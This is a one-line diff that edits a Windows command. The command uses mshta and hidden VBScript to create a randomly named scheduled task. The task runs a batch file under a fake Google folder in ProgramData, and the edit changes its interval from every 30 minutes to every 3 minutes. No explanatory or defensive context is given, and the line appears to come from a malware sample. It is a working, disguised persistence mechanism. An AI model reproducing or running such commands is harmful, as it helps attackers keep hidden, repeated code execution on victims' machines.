@@ -1,1 +1,1 @@
-mshta vbscript:Execute("CreateObject(""WScript.Shell"").rUn ""schtasks /create /tn """"{3SLD-GCST-TL2T-IDID-0SWD-JD6U}"""" /tr """"C:\ProgramData\Google\Maps\Maps.bat"""" /sc minute /mo 30 /f"", 0:close")
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").rUn ""schtasks /create /tn """"{3SLD-GCST-TL2T-IDID-0SWD-JD6U}"""" /tr """"C:\ProgramData\Google\Jod.bat"""" /sc minute /mo 3 /f"", 0:close")
